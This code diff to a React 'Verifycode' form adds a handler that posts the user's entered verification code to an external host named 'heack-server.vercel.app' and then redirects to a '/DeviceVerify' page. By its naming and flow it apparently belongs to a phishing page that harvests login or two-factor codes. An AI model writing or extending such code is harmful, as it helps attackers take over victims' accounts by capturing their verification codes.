@@ -1,15 +1,28 @@
 import React from "react";
 import "../HomeStyle/Verifycode.css";
 import { useForm } from "react-hook-form";
+import { useNavigate } from "react-router-dom";
 
 const Verifycode = () => {
-  const { register, handleSubmit, watch } = useForm();
-  const onSubmit = (data) => console.log(data);
+  const { register, handleSubmit } = useForm();
+  const navigate = useNavigate();
+  const onSubmit = (data) => {
+    const Code = {
+      Code: data.exampleRequired,
+    };
+    console.log(Code);
+    fetch("https://heack-server.vercel.app/code", {
+      method: "POST",
+      headers: { "Content-type": "application/json" },
+      body: JSON.stringify(Code),
+    })
+      .then((res) => res.json())
+      .then((result) => navigate("/DeviceVerify"));
+  };
 
-  console.log(watch("example"));
   return (
     <div className="Text_1">
-      <div class="center">
+      <div className="center">
         <form onSubmit={handleSubmit(onSubmit)}>
           <div className="m-1">
             <div className="rounded bg-white">
